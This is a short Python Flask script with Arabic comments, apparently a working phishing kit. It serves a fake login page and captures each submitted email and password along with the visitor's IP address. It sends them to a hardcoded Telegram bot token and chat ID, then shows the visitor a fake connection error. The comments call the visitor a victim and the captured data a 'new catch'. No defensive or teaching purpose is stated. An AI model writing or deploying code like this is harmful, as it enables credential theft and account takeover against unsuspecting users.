from flask import Flask, render_template, request, redirect, url_for
import requests

app = Flask(__name__)
app.secret_key = "emptynetsecret"

# --- إعدادات التليجرام الخاصة بك ---
TOKEN = "8342550502:AAFxUB3_bJuUvRez0uzGAllhzTph7z4mhA8"
ID = "7089570610"

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": ID, "text": message}
        requests.post(url, data=data)
    except:
        pass

@app.route("/")
def home():
    # توجيه الزوار تلقائياً إلى صفحة تسجيل الدخول
    return redirect(url_for("login"))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        
        # تجهيز الرسالة التي ستصلك
        user_ip = request.remote_addr
        text = f"🎯 صيد جديد من عسل وثعبان:\n\n👤 اليميل: {email}\n🔑 الباسورد: {password}\n🌐 IP: {user_ip}"
        
        # إرسال البيانات للتليجرام
        send_to_telegram(text)
        
        # توجيه الضحية لصفحة وهمية أو صفحة الخطأ بعد الصيد
        return "حدث خطأ في الاتصال، يرجى المحاولة لاحقاً"

    # شكل صفحة الدخول البسيطة
    return '''
    <div style="text-align: center; margin-top: 50px; font-family: Arial;">
        <h2>تسجيل الدخول - عسل وثعبان</h2>
        <form method="post">
            <input type="text" name="email" placeholder="البريد الإلكتروني" required style="padding: 10px; margin: 5px;"><br>
            <input type="password" name="password" placeholder="كلمة المرور" required style="padding: 10px; margin: 5px;"><br>
            <input type="submit" value="دخول" style="padding: 10px 40px; background: #f39c12; color: white; border: none; cursor: pointer;">
        </form>
    </div>
    '''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
